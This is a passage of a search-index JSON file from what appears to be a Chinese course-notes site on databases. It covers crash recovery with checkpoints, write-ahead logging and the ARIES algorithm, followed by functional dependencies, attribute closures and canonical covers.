CheckPoints\uff0c\u4ee5\u9632\u6b62\u6570\u636e\u5e93\u6062\u590d\u9700\u8981\u8bfb\u53d6\u7684 Log \u592a\u591a\u3002</p> <p>\u5728\u6267\u884c Checkpointing \u65f6\uff1a</p> <ul> <li>&lt;1&gt; \u5c06\u4e3b\u5b58\u4e2d\u7684\u6240\u6709 Log Record \u90fd\u5199\u5165\u78c1\u76d8</li> <li>&lt;2&gt; \u5c06\u6240\u6709\u88ab\u66f4\u65b0\u8fc7\u4e86\u7684 Buffer Blocks \u90fd\u5199\u5165\u78c1\u76d8</li> <li>&lt;3&gt; \u5199\u5165\u4e00\u6761\u65e5\u5fd7 <code>&lt;CheckPoint L&gt;</code> \u5230\u78c1\u76d8<ul> <li><code>L</code> \u662f\u6267\u884c CheckPoint \u65f6\u8fd8\u5728\u6d3b\u8dc3\u7684\u4e8b\u52a1\u5217\u8868</li> </ul> </li> </ul> <p>Checkpointing \u65f6\u6240\u6709 Updates \u90fd\u4f1a\u505c\u6b62</p> <p>\u5728\u6267\u884c\u6062\u590d\u65f6\uff0c\u6211\u4eec\u9996\u5148\u627e\u5230\u8bb0\u5f55 <code>&lt;CheckPoint L&gt;</code>\uff0c\u53ea\u6709 <code>L</code> \u4ee5\u53ca\u4f4d\u4e8e\u68c0\u67e5\u70b9\u4e4b\u540e\u5f00\u59cb\u7684\u4e8b\u52a1\u9700\u8981 Redo \u548c Undo\u3002</p>"},{"location":"Courses/DB/Recovery%20System/#recovery-with-concurrent-transactions","title":"Recovery With Concurrent Transactions","text":"<pre><code>undo_list = []\nredo_list = []\nlog_ptr = the end of log\nwhile (*log_ptr != &lt;checkpoint L&gt;):\n    switch (log_ptr-&gt;type):\n        case &lt;T_i, commit&gt;:\n            redo_list.append(T_i)\n        case &lt;T_i, start&gt;:\n            if not T_i in redo_list:\n                undo_list.append(T_i)\n        case &lt;T_i, abort&gt;:\n            undo_list.append(T_i)\nfor txn in L:\n    if not T_i in redo_list:\n        undo_list.append(T_i)\n</code></pre> <p>\u5728\u5f97\u5230\u4e24\u4e2a\u5217\u8868\u540e\uff0c\u5148\u4ece\u540e\u5411\u524d Undo\uff0c\u518d\u4ece Checkpoint \u5411\u540e Redo\u3002</p> <p></p>"},{"location":"Courses/DB/Recovery%20System/#buffer-management","title":"Buffer Management","text":"<p>\u4e3b\u5b58\u548c Stable Storage \u4ea4\u4e92\u7684\u6700\u5c0f\u5355\u4f4d\u65f6 Block\uff0c\u800c\u4e00\u4e2a Log Record \u7684\u5927\u5c0f\u8fdc\u5c0f\u4e8e\u4e00\u4e2a Block\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u6bcf\u6b21\u90fd\u76f4\u63a5\u5c06\u5355\u4e2a Log \u5199\u5165\u78c1\u76d8\u3002\u901a\u5e38\uff0cLog \u90fd\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d\uff0c\u53ea\u6709\u5982\u4e0b\u60c5\u51b5\u624d\u4f1a\u8f93\u51fa\u5230\u78c1\u76d8\u4e2d\uff1a</p> <ul> <li>&lt;1&gt; Blocks of log records in buffer are full</li> <li>&lt;2&gt; Log Force operation is executed<ul> <li>checkpoint happens</li> <li>\u5982\u679c\u91c7\u7528 Force Policy \u6062\u590d\u7b97\u6cd5\uff0c\u4e00\u4e2a\u4e8b\u52a1 <code>COMMIT</code> \u65f6\u4e5f\u8981\u5c06\u5176\u6240\u6709 LOG \u90fd\u5f3a\u5236\u5199\u56de</li> </ul> </li> </ul> <p>Rules for Log Record Buffering</p> <ul> <li>\u53ea\u6709 Log <code>&lt;T_i, commit&gt;</code> \u5199\u5165\u78c1\u76d8\u540e \\(T_i\\) \u624d\u80fd\u8fdb\u5165 <code>COMMIT</code> \u72b6\u6001</li> <li>\u6240\u6709 \\(T_i\\) \u76f8\u5173 Log \u90fd\u5f97\u65e9\u4e8e <code>&lt;T_i, commit&gt;</code> \u5199\u5165\u78c1\u76d8</li> <li>Log \u7684\u5199\u5165\u9700\u8981\u65e9\u4e8e\u5176\u5bf9\u5e94\u7684\u6570\u636e\u9879<ul> <li>\u5373 Write-Ahead Logging rule, WAL</li> </ul> </li> </ul> <p>Latch</p> <p>\u5728\u5c06\u4e00\u4e2a Block \u5199\u56de\u78c1\u76d8\u7684\u65f6\u5019\uff0c\u5176\u4e2d\u7684\u6570\u636e\u9879\u4e0d\u5e94\u8be5\u88ab\u5176\u5b83\u66f4\u65b0\u4fee\u6539\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u8fd9\u4e2a Block \u7533\u8bf7\u4e00\u4e2a Exlusive Lock\u3002\u8fd9\u79cd\u77ed\u671f\u9501\u5b9e\u9645\u88ab\u79f0\u4e3a Latch\u3002</p> <p>Database Buffer \u53ef\u4ee5\u5728 Real Main Memory \u6216\u8005 Virtual Memory \u4e2d\u6267\u884c\uff0c\u5b83\u4eec\u5404\u6709\u4f18\u52a3\uff1a</p> Drawbacks of Reserved Main-MemoryDrawbacks of Virtual Memory <ul> <li>\u5185\u5b58\u4e8b\u5148\u88ab\u5212\u5206\uff0c\u7075\u6d3b\u6027\u88ab\u9650\u5236</li> <li>\u5185\u5b58\u7684\u5212\u5206\u4e0d\u53ef\u6539\u53d8\uff0c\u56e0\u6b64\u5f53 DB \u7684\u9700\u6c42\u6539\u53d8\u65f6\u96be\u4ee5\u66f4\u6539 Buffer \u5927\u5c0f</li> </ul> <ul> <li>Page \u7684\u5199\u56de\u53ef\u80fd\u9700\u8981\u4ece\u78c1\u76d8\u7684 Swap Space \u4e2d\u53d6\u51fa\u5bf9\u5e94\u5757\uff0c\u518d\u5199\u56de\uff0c\u5373\u9020\u6210\u989d\u5916 IO\uff0c\u8fd9\u88ab\u79f0\u4e3a Dual Paging Problem<ul> <li>Swap Space \u662f\u78c1\u76d8\u6682\u5b58\u201c\u6ea2\u51fa\u201d\u7684\u5185\u5b58\u7684\u533a\u57df</li> </ul> </li> <li>\u7406\u60f3\u60c5\u51b5\u4e0b\uff0c\u5f53 OS \u6253\u7b97\u56de\u6536\u67d0\u4e2a Page \u65f6\uff0c\u5b83\u5e94\u8be5\u5148\u901a\u77e5 DBMS\uff0c\u5982\u679c\u8fd9\u4e2a Page \u4e0d\u662f Dirty \u7684\uff0c\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u91ca\u653e\uff1b\u5982\u679c\u662f Dirty \u7684\uff0c\u90a3\u4e48\u5148\u5199\u5165\u76f8\u5173\u65e5\u5fd7\uff0c\u518d\u628a\u8be5\u6570\u636e\u9875\u5199\u5165\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u4e4b\u540e\u4e5f\u53ef\u4ee5\u76f4\u63a5\u91ca\u653e\uff0c\u4e0d\u9700\u8981\u653e\u5165\u4e34\u65f6\u7684 Swap Space\uff0c\u4ece\u800c\u907f\u5f00 Dual Paging Problem<ul> <li>\u53ef\u60dc\u4e00\u822c OS \u4e0d\u652f\u6301\u8fd9\u4e2a\u529f\u80fd</li> </ul> </li> </ul>"},{"location":"Courses/DB/Recovery%20System/#advanced-recovery-techniques","title":"Advanced Recovery Techniques*","text":"<p>\u5bf9\u4e8e update log\uff0c\u6211\u4eec\u4e3a\u5176\u5305\u88f9\u4e00\u5c42\u903b\u8f91\u64cd\u4f5c\u65e5\u5fd7\uff0c\u5176\u4e2d \\(O_j\\) \u662f\u8be5\u64cd\u4f5c\u5b9e\u4f8b\u7684 unique identifier\uff1a</p> <pre><code>&lt;T_i, O_j, operation-begin&gt;\n&lt;T_i, A, 100, 300&gt;\n&lt;T_i, O_j, operation-end, (A, -200)&gt;\n</code></pre> <p>\u5728 <code>operation-end</code> \u91cc\u5305\u542b\u4e86 Logical Undo Information\uff0c\u5f53 crash \u53d1\u751f\uff0c\u9700\u8981 undo \u8fd9\u4e2a\u4e8b\u52a1\u7684\u65f6\u5019\uff0c\u5982\u679c\u80fd\u591f\u8bfb\u53d6\u5230\u8fd9\u4e2a\u65e5\u5fd7\uff0c\u5219\u4f7f\u7528 Logical Undo\uff0c\u5ffd\u7565\u4e2d\u95f4\u7684\u7269\u7406\u65e5\u5fd7\uff1b\u5982\u679c\u53ea\u80fd\u627e\u5230 <code>operation-begin</code>\uff0c\u4f46\u627e\u4e0d\u5230\u5bf9\u5e94 <code>operation-end</code>\uff0c\u5219\u4f7f\u7528 Physical Undo\u3002</p> <p>Undo \u65f6\uff0c\u4e66\u5199\u7684 Undo \u65e5\u5fd7\u683c\u5f0f\u4e3a\uff1a</p> <pre><code>&lt;T_i, O_j, operation-abort&gt;\n</code></pre> \u9898\u9762\u89e3\u7b54 <p></p> <p></p> <p>\u6ce8\u610f\u7684\u51e0\u4e2a\u70b9</p> <ul> <li>Undo \u7684 start-point \u4e3a\u6700\u540e\u4e00\u6761\u65e5\u5fd7</li> <li>\u6ce8\u610f (4) \u7684 <code>&lt;T_1, C, 600&gt;</code> \u662f\u600e\u4e48\u5f97\u5230\u7684</li> </ul>"},{"location":"Courses/DB/Recovery%20System/#aries","title":"ARIES \u7b97\u6cd5","text":""},{"location":"Courses/DB/Recovery%20System/#data-structure","title":"Data Structure","text":"<p>\u6211\u4eec\u4e4b\u524d\u63d0\u5230\u7684\u6062\u590d\u7b97\u6cd5\u5176\u5b9e\u90fd\u662f\u57fa\u4e8e ARIES \u7b97\u6cd5\u7b80\u5316\u7684\uff0c\u5b83\u4eec\u53bb\u9664\u4e86 Optimization \u90e8\u5206\u3002\u8ddf\u5b83\u4eec\u76f8\u6bd4\uff0cARIES \u7b97\u6cd5\u6709\u5982\u4e0b\u7279\u5f81\uff1a</p> <ul> <li>&lt;1&gt; \u4f7f\u7528 Log Sequence Number(LSN) \u6765\u6807\u5fd7 Log Records<ul> <li>LSNs \u4ee5 Page \u7684\u5f62\u5f0f\u5b58\u50a8</li> </ul> </li> <li>&lt;2&gt; Physiological Redo<ul> <li>\u662f\u4ecb\u4e8e\u7269\u7406\u548c\u903b\u8f91 Redo \u4e2d\u7684\u7b56\u7565\uff0c\u5b83\u4ee5\u7269\u7406\u7684\u65b9\u5f0f\u5b9a\u4f4d\u53d7\u5f71\u54cd\u7684 Page\uff0c\u4ee5\u903b\u8f91\u7684\u65b9\u5f0f\u8bb0\u5f55\u4e1a\u5185\u7684\u64cd\u4f5c</li> <li>\u76f8\u6bd4\u4e8e\u7269\u7406 Redo \u9700\u8981\u8bb0\u5f55\u6574\u4e2a Page \u7684\u5b57\u8282\u53d8\u5316\uff0cPhysiological Redo \u53ea\u9700\u8981\u8bb0\u5f55\u9875\u5185\u7f16\u53f7 + slot \u64cd\u4f5c\uff0c\u8282\u7701\u5927\u91cf\u7a7a\u95f4</li> <li>Warning: \u8981\u6c42 Page \u7684\u5199\u56de\u662f\u539f\u5b50\u64cd\u4f5c </li> </ul> </li> <li>&lt;3&gt; \u7ef4\u62a4 Dirty Page Table \u6765\u907f\u514d\u4e0d\u5fc5\u8981\u7684 Redo \u64cd\u4f5c</li> <li>&lt;4&gt; \u4f7f\u7528 Fuzzy Checkpoint\uff0c\u5728\u68c0\u67e5\u70b9\u53ea\u8bb0\u5f55\u810f\u9875\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u4e0d\u8981\u6c42\u810f\u9875\u5199\u56de</li> </ul> <p>Log Sequence Number</p> <p>LSN \u4f5c\u4e3a Log \u7684\u6807\u8bc6\u7b26\uff0c\u8981\u6c42\u987a\u5e8f\u9012\u589e\u3002\u4e3a\u4e86\u52a0\u5feb\u8bbf\u95ee\u901f\u5ea6\uff0c\u901a\u5e38\u76f4\u63a5\u53d6 Log \u5728\u4e1a\u5185\u7684\u504f\u79fb\u4f5c\u4e3a LSN\u3002</p> <p>\u6211\u4eec\u5728 Page \u7684\u9996\u90e8\u4e2d\u8fd8\u9700\u989d\u5916\u7ef4\u62a4 PageLSN\uff0c\u7528\u6765\u5b58\u50a8\u6700\u540e\u4e00\u6761\u5f71\u54cd\u8be5 Page \u7684\u65e5\u5fd7\u7684 LSN\u3002\u5728\u6062\u590d\u9636\u6bb5\uff0cLSN \u503c\u4e0d\u8d85\u8fc7 PageLSN \u7684\u65e5\u5fd7\u8bb0\u5f55\u4e0d\u4f1a\u5728\u8be5\u9875\u4e0a\u6267\u884c\uff0c\u4ece\u800c\u907f\u514d\u91cd\u590d\u7684 Redo\u3002</p> <p>\u4e00\u4e2a\u666e\u901a\u7684 Log Record \u7684\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>+-----+---------+---------+----------+----------+\n| LSN | TransID | PrevLSN | RedoInfo | UndoInfo |\n+-----+---------+---------+----------+----------+\n</code></pre> <p>\u5728\u4e4b\u524d\u7684\u6062\u590d\u7b97\u6cd5\u4e2d\uff0cUndo \u9636\u6bb5\u65f6\u6211\u4eec\u9700\u8981\u4e3a\u6240\u6709\u88ab Undo \u7684\u65e5\u5fd7\u5199\u5165\u5bf9\u5e94\u7684 Undo Log\u3002\u5728 ARIES \u4e2d\uff0c\u8be5\u65e5\u5fd7\u79f0\u4e3a Compensation Log Record(CLR)\uff0c\u662f\u4e00\u4e2a Read-Only \u7684\u65e5\u5fd7\u8bb0\u5f55\uff0c\u5e76\u4e14\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u5b57\u6bb5 <code>UndoNextLSN</code>\uff0c\u7528\u4e8e\u6307\u5411\u4e0b\u4e00\u4e2a\u9700\u8981\u6267\u884c Undo \u64cd\u4f5c\u7684\u65e5\u5fd7\uff1a</p> <pre><code>+-----+---------+-------------+----------+\n| LSN | TransID | UndoNextLSN | RedoInfo |\n+-----+---------+-------------+----------+\n</code></pre> <p>\u5728\u8be5 CLR \u548c\u5176 <code>UndoNextLSN</code> \u4e4b\u95f4\u7684\u6240\u6709\u65e5\u5fd7\u90fd\u5df2\u7ecf\u88ab Undo \u4e86\uff0c\u4ece\u800c\u907f\u514d\u4e86\u91cd\u590d\u7684 Undo \u64cd\u4f5c</p> <p></p> <p>Dirty Page Table \u8bb0\u5f55\u4ecd\u5728 Buffer \u4e2d\u3001\u5df2\u7ecf\u88ab\u66f4\u65b0\u8fc7\u7684 Page \u7684\u4fe1\u606f\uff0c\u5305\u62ec\uff1a</p> <ul> <li>PageLSN</li> <li>RecLSN LSN \u5c0f\u4e8e RecLSN \u7684\u65e5\u5fd7\u90fd\u5df2\u7ecf\u751f\u6548\u4e14\u5199\u56de\u78c1\u76d8\u4e2d\u4e86<ul> <li>\u5f53\u4e00\u4e2a Page \u88ab\u63d2\u5165\u810f\u9875\u8868\u4e2d\u65f6\uff0c\u8bbe\u7f6e RecLSN = PageLSN\uff08\u66f4\u65b0\u524d\u4e00\u523b\u7684\uff09</li> </ul> </li> </ul> <p>\u53ea\u8981\u4e00\u4e2a Dirty Page \u88ab\u5199\u5165\u78c1\u76d8\uff0c\u5219\u4ece\u810f\u9875\u8868\u4e2d\u79fb\u9664\u8be5\u9875\u3002</p> <p>ARIES Data Structure</p> <p></p> <ul> <li><code>4894.1</code> \u8868\u793a Page 4894 \u7684\u7b2c\u4e00\u4e2a\u6570\u636e</li> <li><code>RecLSN = 7564</code> \u8868\u793a\u4ece LSN 7564 \u5f00\u59cb\u7684 Log \u5c31\u6ca1\u6709\u5bf9 Stable Data \u4e2d\u7684\u8868\u751f\u6548\u4e86\uff08\u5c3d\u7ba1\u5b83\u4eec\u5df2\u7ecf\u8fdb\u5165 Stable Log \u4e2d\uff09</li> </ul> <p>\u5728 CheckPoint\uff0c\u8bb0\u5f55\u5f53\u524d Dirty Page Table \u548c\u5f53\u524d\u6b63\u5728\u6d3b\u8dc3\u7684\u4e8b\u52a1\u3002\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u6d3b\u8dc3\u4e8b\u52a1\uff0c\u8bb0\u5f55\u5b83\u4eec\u5199\u5165\u7684\u6700\u540e\u4e00\u4e2a Log Record \u7684 LSN\uff0c\u8bb0\u4e3a LastLSN\u3002</p> <p>\u810f\u9875\u4e0d\u5fc5\u5728 CheckPoint \u5199\u56de\uff0c\u5b83\u4eec\u5728\u540e\u53f0\u6301\u7eed\u5199\u56de\uff0c\u56e0\u6b64 CheckPoint \u7684\u6d88\u8017\u8f83\u5c0f\uff0c\u53ef\u4ee5\u76f8\u5bf9\u66f4\u9891\u7e41\u7684\u8bbe\u7f6e\u3002</p>"},{"location":"Courses/DB/Recovery%20System/#recovery-algorithm","title":"Recovery Algorithm","text":"<p>ARIES \u7684\u6062\u590d\u7b97\u6cd5\u5206\u4e3a\u4e09\u4e2a\u9636\u6bb5\uff1a\u5206\u6790\u9636\u6bb5\u3001Redo\u9636\u6bb5\u3001Undo\u9636\u6bb5\u3002</p> <ul> <li>&lt;1&gt; Analysis pass<ul> <li>\u4ece\u6700\u540e\u4e00\u4e2a CheckPoint \u5f00\u59cb</li> <li>\u8bfb\u53d6 Dirty Page Table<ul> <li>\u8bbe\u7f6e <code>RedoLSN = min RecLSN</code>\uff08\u810f\u9875\u8868\u4e2d\u7684\u6700\u5c0f RecLSN\uff09\uff0c\u5982\u679c\u810f\u9875\u8868\u4e3a\u7a7a\uff0c\u5219\u8bbe\u7f6e\u4e3a CheckPoint \u7684 LSN</li> <li>\u521d\u59cb\u5316 Undo List \u4e3a CheckPoint \u4e2d\u8bb0\u5f55\u7684\u6d3b\u8dc3\u4e8b\u52a1</li> <li>\u8bfb\u53d6 Undo List \u4e2d\u6bcf\u4e00\u4e2a\u4e8b\u52a1\u7684\u6700\u540e\u4e00\u6761 Log \u7684 LSN</li> </ul> </li> <li>\u4ece CheckPoint \u5f00\u59cb\u6b63\u5411\u626b\u63cf<ul> <li>\u5982\u679c\u53d1\u73b0\u4e86\u4e0d\u5728 Undo List \u4e2d\u7684\u4e8b\u52a1\u5219\u52a0\u5165 Undo List</li> <li>\u5982\u679c\u53d1\u73b0\u4e86 Update Log Record\uff0c\u5982\u679c\u5176\u4fee\u6539\u7684 PageID \u4e0d\u5728\u91cc\u9762\uff0c\u5219\u5c06\u5176\u52a0\u5165\u810f\u9875\u8868\u4e2d\uff0c\u5e76\u8bbe\u7f6e\u5176 RecLSN \u4e3a\u8be5\u65e5\u5fd7\u7684 LSN\uff0c\u7528\u4e8e Redo<ul> <li>\u65e0\u8bba\u5728\u4e0d\u5728\uff0c\u90fd\u8981\u4fee\u6539\u810f\u9875\u8868\u7684 PageID \u90e8\u5206</li> </ul> </li> <li>\u5982\u679c\u53d1\u73b0\u4e86\u4e8b\u52a1\u7684 End Log\uff0c\u5219\u5c06\u5176\u4ece Undo List \u4e2d\u79fb\u9664</li> <li>\u626b\u63cf\u8fc7\u7a0b\u4e2d\u8bb0\u5f97\u8bb0\u5f55\u6bcf\u4e00\u4e2a\u4e8b\u52a1\u7684\u6700\u540e\u4e00\u6761\u65e5\u5fd7\u7684 LSN\uff0c\u7528\u4e8e Undo</li> </ul> </li> </ul> </li> <li>&lt;2&gt; Redo pass<ul> <li>\u4ece RedoLSN \u5f00\u59cb\u6b63\u5411\u626b\u63cf \uff0c\u5f53\u53d1\u73b0\u66f4\u65b0\u8bb0\u5f55\u7684\u65f6\u5019<ul> <li>\u5982\u679c\u5bf9\u5e94 Page \u4e0d\u5728\u810f\u9875\u8868\u4e2d\u3002\u6216\u8005\u8fd9\u4e00\u6761\u8bb0\u5f55\u7684 LSN \u5c0f\u4e8e\u9875\u9762\u7684 RecLSN \u5c31\u5ffd\u7565\u8fd9\u4e00\u6761</li> <li>\u5426\u5219\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u8fd9\u4e00\u9875\uff0c\u5982\u679c\u78c1\u76d8\u4e2d\u5f97\u5230\u7684\u8fd9\u4e00\u9875\u7684 PageLSN \u5c0f\u4e8e\u8be5 Log\uff0c\u5c31 redo\uff0c\u5426\u5219\u5c31\u5ffd\u7565\u8fd9\u4e00\u6761\u8bb0\u5f55</li> </ul> </li> </ul> </li> <li>&lt;3&gt; Undo pass<ul> <li>\u4ece\u5206\u6790\u9636\u6bb5\u83b7\u5f97\u7684\u6bcf\u4e2a\u4e8b\u52a1\u6700\u540e\u4e00\u6761\u65e5\u5fd7\u7684 LSN \u5f00\u59cb\uff0c\u63a5\u4e0b\u6765\u6bcf\u4e00\u6b65\u90fd\u9009\u53d6\u8fd9\u4e4b\u4e2d LSN \u6700\u5927\u7684\u65e5\u5fd7\u5f00\u59cb Undo</li> <li>\u5728 undo \u4e00\u6761\u8bb0\u5f55\u4e4b\u540e<ul> <li>\u5bf9\u4e8e\u666e\u901a\u7684\u8bb0\u5f55\uff0c\u5c06 NextLSN \u8bbe\u7f6e\u4e3a PrevLSN</li> <li>\u5bf9\u4e8eCLR\u8bb0\u5f55\uff0c\u5c06 NextLSN \u8bbe\u7f6e\u4e3a UndoNextLSN<ul> <li>\u8fd9\u4e4b\u95f4\u7684\u65e5\u5fd7\u5c06\u88ab\u8df3\u8fc7\uff0c\u4e0d\u4f1a\u6267\u884c Undo</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Question</p> <p></p> <p>\u4f8b\u9898</p> \u9898\u9762\u89e3\u7b54 <p></p> <p></p>"},{"location":"Courses/DB/Relational%20Database%20Design/","title":"Relational Database Design","text":""},{"location":"Courses/DB/Relational%20Database%20Design/#relational-database-design","title":"Relational Database Design","text":"<p> \u7ea6 2407 \u4e2a\u5b57  18 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p>"},{"location":"Courses/DB/Relational%20Database%20Design/#functional-dependencies","title":"Functional Dependencies","text":"<p>\u7528 \\(R\\) \u8868\u793a\u4e00\u4e2a Relational Schema\uff0c\\(\\alpha \\subseteq R\\) \u548c \\(\\beta \\subseteq R\\) \u5206\u522b\u4e3a \\(R\\) \u7684\u4e00\u7ec4\u5c5e\u6027\u3002</p> <p>\u3010Definition\u3011  \u4eff\u7167\u6570\u5b66\u4e0a\u7684\u51fd\u6570\u6982\u5ff5\uff0c\u6211\u4eec\u5b9a\u4e49 \\(R\\) \u4e0a\u7684\u4e00\u4e2a Functional Dependency \\(\\alpha \\rightarrow \\beta\\) \u5f53\u4e14\u4ec5\u5f53\u5bf9\u4e8e\u4efb\u610f\u5408\u6cd5\u5173\u7cfb \\(r(R)\\) \u7684\u4e24\u4e2a Tuples \\(t_1, t_2\\) \uff0c\u5176\u6ee1\u8db3\uff1a</p> \\[ t_1[\\alpha] = t_[\\alpha] \\Rightarrow t_1[\\beta] =t_2[\\beta] \\] <p>\u6b64\u65f6\u79f0\uff1a</p> <ul> <li>\\(\\beta\\) functionally dependant on \\(\\alpha\\)</li> <li>\\(\\alpha\\) functionally determines \\(\\beta\\)</li> </ul> <p>\u6211\u4eec\u7528 \\(F\\) \u8868\u793a\u4e00\u7ec4 Functional Dependencies\uff0c\u4f8b\u5982\uff1a</p> <p></p> <p>Closure of a Set of Functional Dependencies</p> <p>\u5b9a\u4e49\u80fd\u7528 \\(F\\) \u903b\u8f91\u63a8\u7406\u51fa\u6765\u7684\u6700\u5927 Functional Dependencies \u96c6\u5408\u4e3a \\(F\\) \u7684 Closure\uff0c\u7528 \\(F^+\\) \u8868\u793a\u3002\u5728\u8fd9\u91cc\u7ed9\u51fa\u7528\u4e8e\u8ba1\u7b97\u51fd\u6570\u4f9d\u8d56\u7684 Armstrong's Axioms \u53ca\u5176\u8865\u5145\u5b9a\u5f8b\uff1a</p> <ul> <li>&lt;1&gt; \u81ea\u53cd\u5f8b\uff1a if \\(\\beta \\subseteq \\alpha\\), then \\(\\alpha \\rightarrow \\beta\\)</li> <li>&lt;2&gt; \u589e\u8865\u5f8b\uff1a if \\(\\alpha \\rightarrow \\beta\\), then \\(\\gamma \\alpha \\rightarrow \\gamma \\beta\\)</li> <li>&lt;3&gt; \u4f20\u9012\u5f8b\uff1a if \\(\\alpha \\rightarrow \\beta\\) and \\(\\beta \\rightarrow \\gamma\\), then \\(\\alpha \\rightarrow \\gamma\\)</li> <li>&lt;4&gt; \u5408\u5e76\u5f8b\uff1a if \\(\\alpha \\rightarrow \\beta\\) and \\(\\alpha \\rightarrow \\gamma\\), then \\(\\alpha \\rightarrow \\beta \\gamma\\)</li> <li>&lt;5&gt; \u5206\u89e3\u5f8b\uff1a if \\(\\alpha \\rightarrow \\beta\\gamma\\), then \\(\\alpha \\rightarrow \\beta\\) and \\(\\alpha \\rightarrow \\gamma\\)</li> </ul> <p>\u4e00\u79cd\u6839\u636e \\(F\\) \u8ba1\u7b97 \\(F^+\\) \u7684\u601d\u60f3\u662f\u4e0d\u65ad\u91cd\u590d\u904d\u5386 \\(F\\) \u5185\u7684 FDs(Functional Dependency)\uff0c\u4e3a\u5176\u5e94\u7528\u81ea\u53cd\u5f8b\u3001\u589e\u8865\u5f8b\u3001\u4f20\u9012\u5f8b\uff0c\u76f4\u5230 \\(F\\) \u7684\u5185\u5bb9\u4e0d\u518d\u6539\u53d8\u4e3a\u6b62\u3002\u5bf9\u4e8e\u4e00\u4e2a n attribute \u7684 Schema\uff0c\u5176\u6700\u5927\u53ef\u80fd FDs \u53ef\u8fbe \\(2^n \\times 2^n\\) \u4e2a\u3002</p> <p>\u53e6\u4e00\u79cd\u66ff\u4ee3\u7b56\u7565\u662f\u5229\u7528 Closure of Attribute Sets\uff0c\u5176\u8ba1\u7b97\u6b65\u9aa4\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>for \u03b3 in R:\n    Compute \u03b3+\n    for S in \u03b3+:\n        add \u03b3-&gt;S to F+\n</code></pre> <p>Closure of Attribute Sets</p> <p>Closure of Attribute Sets \u5e38\u7528\u6765\u68c0\u6d4b\u5c5e\u6027\u96c6 \\(\\alpha\\) \u662f\u5426\u4e3a Superkey\uff0c\u7528 \\(\\alpha ^+\\) \u8868\u793a\uff0c\u5176\u5185\u5bb9\u4e3a\u5728 Functional Dependencies \\(F\\) \u4e0b\u7531 \\(\\alpha\\) \u76f4\u63a5\u6216\u95f4\u63a5\u51b3\u5b9a\u7684\u5c5e\u6027\u7684\u96c6\u5408\u3002</p> <p>\u4e0e \\(F^+\\) \u4e0d\u540c\uff0cClosure of Attribute Sets \u672c\u8eab\u4e5f\u662f Attribute \u7684\u96c6\u5408</p> <p>\u8ba1\u7b97 \\(\\alpha^+\\) \u7684\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>result := \u03b1\nwhile (changes to result):\n    for each \u03b2 -&gt; \u03b3 in F:\n        if \u03b2 in result: result += \u03b3\n\u03b1+ := result\n</code></pre> <p></p> <p>\u5b9a\u4e49 \\(\\alpha^+\\) \u540e\uff0c\u5c31\u53ef\u4ee5\u7528\u5176\u6765\u8fdb\u884c Super Key \u548c Candidate Key \u7684\u5224\u65ad\u3002\u5982\u679c Relational Schema \\(R\\) \u5c5e\u4e8e \\(\\alpha^+\\) \uff0c\u5219\u5c5e\u6027\u96c6\u5408 \\(\\alpha\\) \u4e3a \\(R\\) \u7684\u4e00\u4e2a Super Key\u3002</p> <p></p> \u901a\u8fc7\u753b\u56fe\u5224\u65ad Candidate Key <p>\u901a\u8fc7\u5c06\u4f9d\u8d56\u5173\u7cfb\u7ed8\u5236\u6210 Graph\uff0c\u90a3\u4e48\u6ca1\u6709\u88ab\u4efb\u4f55\u7bad\u5934\u6307\u5411\u7684 Attribute \u4e00\u5b9a\u662f Candidate \u7684\u4e00\u90e8\u5206\uff08\u53ea\u6709\u5b83\u81ea\u5df1\u51b3\u5b9a\u81ea\u5df1\uff09\uff0c\u4f8b\u5982\uff0c\u4e0b\u4f8b\u4e2d \\(A\\) \u548c \\(G\\) \u90fd\u6ca1\u6709\u88ab\u6307\u5411\uff0c\u5219 \\(AG \\in Candidate\\ Key\\)\uff08\u5b9e\u9645\u4e0a \\(AG\\) \u5c31\u662f\uff09</p> <p></p> <p>Canonical Cover</p> <p>DBMS \u9700\u8981\u4fdd\u6301\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u5173\u4e8e \\(F\\) \u7684\u68c0\u67e5\uff0c\u4ee5\u786e\u4fdd\u6570\u636e\u5e93\u7684\u5b8c\u6574\u6027\u3002\u5982\u679c \\(F\\) \u8fc7\u4e8e\u5de8\u5927\uff0c\u68c0\u67e5\u64cd\u4f5c\u5c06\u4f1a\u53d8\u5f97 Costly\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5c3d\u53ef\u80fd\u7b80\u5316 the set of FDs\u3002</p> <p>\u6211\u4eec\u5c06\u903b\u8f91\u7b49\u4ef7\u4e8e \\(F\\) \u7684\u6700\u5c0f FDs \u96c6\u5408\u79f0\u4e3a a canonical cover of \\(F\\)\uff0c\u8bb0\u4e3a \\(F_c\\)\uff0c\u5176\u4e2d\u201c\u6700\u5c0f\u201d\u4e00\u8bcd\u4f53\u73b0\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; \u4e0d\u5305\u542b\u5197\u4f59 FDs\uff0c\u6ca1\u6709 FDs \u5305\u542b\u5197\u4f59\u5c5e\u6027</li> <li>&lt;2&gt; FDs \u5de6\u4fa7\u90e8\u5206\u4e3a Unique \u7684<ul> <li>\\(\\alpha \\rightarrow \\beta_1, \\alpha \\rightarrow \\beta_2\\) \u5408\u5e76\u4e3a \\(\\alpha \\rightarrow \\beta_1 \\beta_2\\)</li> </ul> </li> </ul> <p>\\(F=\\{A\\rightarrow B, B\\rightarrow C, AC\\rightarrow D\\}\\), Calculate \\(F_c\\)</p> <pre><code>B -&gt;C =&gt; AB-&gt;AC\nAC-&gt;D =&gt; AB-&gt;D\nA -&gt;B =&gt; A -&gt;AB\nAB-&gt;D =&gt; A -&gt;D\nSo AC-&gt;D is extraneous =&gt; A-&gt;D\nF_c = {A-&gt;B, B-&gt;C, 